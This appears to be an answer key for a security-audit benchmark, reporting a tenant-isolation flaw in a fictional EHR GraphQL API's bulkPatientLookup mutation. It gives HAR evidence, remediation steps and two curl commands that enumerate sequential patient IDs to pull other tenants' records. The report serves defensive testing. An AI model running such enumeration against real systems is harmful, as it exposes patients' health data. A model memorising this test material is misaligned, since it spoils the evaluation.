# Expected Response

## System
- Domain: Healthcare / EHR Platform
- System: PatientCore EHR API
- Example ID: GQL-0051

## Priority Findings

### Finding 1: BOLA via Predictable/Sequential Patient IDs — Bulk PHI Enumeration via bulkPatientLookup (Pattern 1.8)
**Severity:** Critical
**Category:** BOLA / Predictable IDs / PHI Exposure

**Summary:**
The `bulkPatientLookup` mutation on `POST /graphql` accepts an arbitrary array of `patientId` values. An attacker from `tenant-7ec2` submitted sequential/predictable IDs `["P-2051", "P-1051", "P-3051"]` and received PHI (Protected Health Information) belonging to `tenant-95e1`. Per §5.0 (Pattern 1.8), the resolver does not enforce ownership — predictable or sequential `patientId` values enable systematic mass PHI harvesting with minimal guessing. This constitutes a HIPAA breach.

**Evidence from HAR:**
- Request: `POST https://api.patientcore-ehr-api.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-7ec2` — attacker's identity
- Mutation payload: `bulkPatientLookup(ids: ["P-2051", "P-1051", "P-3051"]) { patientId tenantId data { sensitiveField } }` — sequential patient IDs submitted
- Response HTTP status: `200 OK`
- Response `tenantId`: `tenant-95e1` — cross-tenant PHI returned
- Response `ownerId`: `other-user-7ec295e1`
- Response `sensitiveField`: `CONFIDENTIAL-7ec295e1` — patient health data disclosed
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-7ec295e1`

**Root Cause (§4.0 RISK-GQL-051 + §5.0):** "`bulkPatientLookup` accepts an arbitrary array of IDs without per-ID ownership filtering." Predictable `patientId` format (P-XXXX) enables systematic enumeration.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-051 | "resolver does NOT verify tenantId against JWT's tenantId" + bulk no per-ID filter |
| context.txt §5.0 | Pattern 1.8 | "predictable or sequential IDs — resolver does not enforce ownership" |
| HAR entry | request.postData | `bulkPatientLookup(ids: ["P-2051", "P-1051", "P-3051"])` from `tenant-7ec2` |
| HAR entry | response.content | `tenantId: "tenant-95e1"`, `sensitiveField: "CONFIDENTIAL-7ec295e1"` |

---

## Steps to Reproduce

### Step 1 — Sequential patient ID enumeration (HAR attack)
```bash
curl -s -X POST https://api.patientcore-ehr-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-7ec2" \
  -d '{"query": "mutation { bulkPatientLookup(ids: [\"P-2051\", \"P-1051\", \"P-3051\"]) { patientId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-95e1"`, `sensitiveField: "CONFIDENTIAL-7ec295e1"` — PHI from `tenant-95e1`.
**Secure outcome:** FORBIDDEN for cross-tenant IDs.

### Step 2 — Extended sequential enumeration
```bash
curl -s -X POST https://api.patientcore-ehr-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-7ec2" \
  -d '{"query": "mutation { bulkPatientLookup(ids: [\"P-2050\", \"P-2051\", \"P-2052\", \"P-2053\"]) { patientId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns PHI for multiple sequential cross-tenant patient IDs — mass enumeration attack enabled by predictable ID format.

## Remediation
1. **Per-ID ownership filter in bulkPatientLookup:** For each patientId, assert `tenant_id = $jwt.tenantId` before returning.
2. **Resolver tenant guard on getPatient:** `WHERE patient_id = $id AND tenant_id = $jwt.tenantId`.
3. **Use non-sequential (UUID-based) patientId:** Replace P-XXXX sequential IDs with UUIDs to prevent predictable enumeration.
4. **Rate limiting on bulk lookups:** Limit batch size and request frequency.
5. **Redis cache key includes tenantId:** §2.0 caches by `patientId` only.
6. **HIPAA audit trail:** Log all cross-tenant access attempts for breach notification compliance.
